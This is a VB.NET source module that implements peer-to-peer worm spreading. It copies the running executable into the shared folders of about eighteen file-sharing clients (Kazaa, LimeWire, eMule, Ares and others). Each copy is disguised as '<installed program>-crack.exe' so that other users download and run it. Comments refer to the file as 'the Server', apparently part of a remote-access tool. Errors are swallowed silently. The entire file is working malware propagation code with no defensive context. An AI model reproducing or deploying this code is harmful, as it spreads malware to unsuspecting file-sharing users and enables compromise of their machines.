Imports System.IO

Module P2P
    Private [me] As String = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName)
    Public Sub p2p()
        Try
            Dim arSharedFolders As New ArrayList()
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Downloads") 'Spread the Server in "Downloaders"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\My Shared Folder") 'Spread the Server in "My Shared Folder"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Shared") 'Spread the Server in "Shared", etc....
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Ares\My Shared Folder")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Downloads")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\Shareaza\Downloads")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\emule\incoming\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\kazaa\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\kazaa lite\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\kazaa lite k++\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\icq\shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\grokster\my grokster\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\bearshare\shared\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\edonkey2000\incoming\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\morpheus\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\limewire\shared\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\tesla\files\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\winmx\shared\")

            Dim folder As IEnumerator = arSharedFolders.GetEnumerator()
            While folder.MoveNext()
                Dim tada As String = Convert.ToString(folder.Current)
                If Directory.Exists(tada) Then
                    Dim progDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                    For Each d As String In Directory.GetDirectories(progDir)
                        Dim app As String = (tada & "\") + d.Substring(d.LastIndexOf("\")).Replace("\", String.Empty) & "-crack.exe"
                        File.Copy([me], app, True)
                    Next
                End If
            End While
        Catch s As Exception
        End Try

    End Sub
End Module